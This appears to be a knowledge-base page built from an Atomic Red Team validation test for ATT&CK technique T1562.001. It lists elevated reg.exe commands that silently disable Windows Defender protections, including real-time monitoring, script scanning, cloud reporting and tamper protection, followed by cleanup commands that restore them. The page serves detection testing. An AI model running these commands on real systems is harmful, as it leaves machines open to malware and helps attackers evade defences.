---
atomic_guid: "1f6743da-6ecc-4a93-b03f-dc357e4b313f"
title: "Tamper with Windows Defender Registry - Reg.exe"
framework: "atomic"
generated: "true"
attack_technique_id: "T1562.001"
attack_technique_name: "Impair Defenses: Disable or Modify Tools"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1562.001/T1562.001.yaml"
build_date: "2026-04-26 14:38:40"
executor: "command_prompt"
aliases:
  - "1f6743da-6ecc-4a93-b03f-dc357e4b313f"
  - "Tamper with Windows Defender Registry - Reg.exe"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[workspaces/index|Notes]]

# Tamper with Windows Defender Registry - Reg.exe

Disable Windows Defender by tampering with windows defender registry using the utility "reg.exe"

## Metadata

- Atomic GUID: 1f6743da-6ecc-4a93-b03f-dc357e4b313f
- Technique: T1562.001: Impair Defenses: Disable or Modify Tools
- Platforms: windows
- Executor: command_prompt
- Elevation Required: True
- Source Path: atomics/T1562.001/T1562.001.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1562-impair_defenses|T1562.001]]

## Executor

- elevation_required: True
- name: command_prompt

### Command

```commandprompt
reg add "HKLM\Software\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /t REG_DWORD /d "1" /f >NUL 2>nul
reg add "HKLM\Software\Policies\Microsoft\Windows Defender" /v "DisableAntiVirus" /t REG_DWORD /d "1" /f >NUL 2>nul
reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableBehaviorMonitoring" /t REG_DWORD /d "1" /f >NUL 2>nul
reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableIntrusionPreventionSystem" /t REG_DWORD /d "1" /f >NUL 2>nul
reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableIOAVProtection" /t REG_DWORD /d "1" /f >NUL 2>nul
reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableOnAccessProtection" /t REG_DWORD /d "1" /f >NUL 2>nul
reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableRealtimeMonitoring" /t REG_DWORD /d "1" /f >NUL 2>nul
reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableRoutinelyTakingAction" /t REG_DWORD /d "1" /f >NUL 2>nul
reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableScanOnRealtimeEnable" /t REG_DWORD /d "1" /f >NUL 2>nul
reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableScriptScanning" /t REG_DWORD /d "1" /f >NUL 2>nul
reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Reporting" /v "DisableEnhancedNotifications" /t REG_DWORD /d "1" /f >NUL 2>nul 
reg add "HKLM\Software\Policies\Microsoft\Windows Defender\SpyNet" /v "DisableBlockAtFirstSeen" /t REG_DWORD /d "1" /f >NUL 2>nul
reg add "HKLM\Software\Policies\Microsoft\Windows Defender\SpyNet" /v "SpynetReporting" /t REG_DWORD /d "0" /f >NUL 2>nul
reg add "HKLM\Software\Policies\Microsoft\Windows Defender\MpEngine" /v "MpEnablePus" /t REG_DWORD /d "0" /f >NUL 2>nul
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\App and Browser protection" /v "DisallowExploitProtectionOverride" /t REG_DWORD /d "0" /f >NUL 2>nul
reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Features" /v "TamperProtection"  /t REG_DWORD /d "0" /f >NUL 2>nul
reg add "HKLM\software\microsoft\windows defender\spynet" /v "SubmitSamplesConsent" /t REG_DWORD /d "0" /f >NUL 2>nul
reg add "HKLM\Software\Microsoft\Windows Defender" /v "PUAProtection" /t REG_DWORD /d "0" /f >NUL 2>nul
```

### Cleanup

```commandprompt
reg add "HKLM\Software\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /t REG_DWORD /d "0" /f >NUL 2>nul
reg add "HKLM\Software\Policies\Microsoft\Windows Defender" /v "DisableAntiVirus" /t REG_DWORD /d "0" /f >NUL 2>nul
reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableBehaviorMonitoring" /t REG_DWORD /d "0" /f >NUL 2>nul
reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableIntrusionPreventionSystem" /t REG_DWORD /d "0" /f >NUL 2>nul
reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableIOAVProtection" /t REG_DWORD /d "0" /f >NUL 2>nul
reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableOnAccessProtection" /t REG_DWORD /d "0" /f >NUL 2>nul
reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableRealtimeMonitoring" /t REG_DWORD /d "0" /f >NUL 2>nul
reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableRoutinelyTakingAction" /t REG_DWORD /d "0" /f >NUL 2>nul
reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableScanOnRealtimeEnable" /t REG_DWORD /d "0" /f >NUL 2>nul
reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableScriptScanning" /t REG_DWORD /d "0" /f >NUL 2>nul
reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Reporting" /v "DisableEnhancedNotifications" /t REG_DWORD /d "0" /f >NUL 2>nul 
reg add "HKLM\Software\Policies\Microsoft\Windows Defender\SpyNet" /v "DisableBlockAtFirstSeen" /t REG_DWORD /d "0" /f >NUL 2>nul
reg add "HKLM\Software\Policies\Microsoft\Windows Defender\SpyNet" /v "SpynetReporting" /t REG_DWORD /d "1" /f >NUL 2>nul
reg add "HKLM\Software\Policies\Microsoft\Windows Defender\MpEngine" /v "MpEnablePus" /t REG_DWORD /d "1" /f >NUL 2>nul
reg add "HKLM\Software\Policies\Microsoft\Windows Defender Security Center\App and Browser protection" /v "DisallowExploitProtectionOverride" /t REG_DWORD /d "1" /f >NUL 2>nul
reg add "HKLM\Software\Microsoft\Windows Defender\Features" /v "TamperProtection"  /t REG_DWORD /d "1" /f >NUL 2>nul
reg add "HKLM\software\microsoft\windows defender\spynet" /v "SubmitSamplesConsent" /t REG_DWORD /d "1" /f >NUL 2>nul
reg add "HKLM\Software\Microsoft\Windows Defender" /v "PUAProtection" /t REG_DWORD /d "1" /f >NUL 2>nul
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1562.001/T1562.001.yaml)
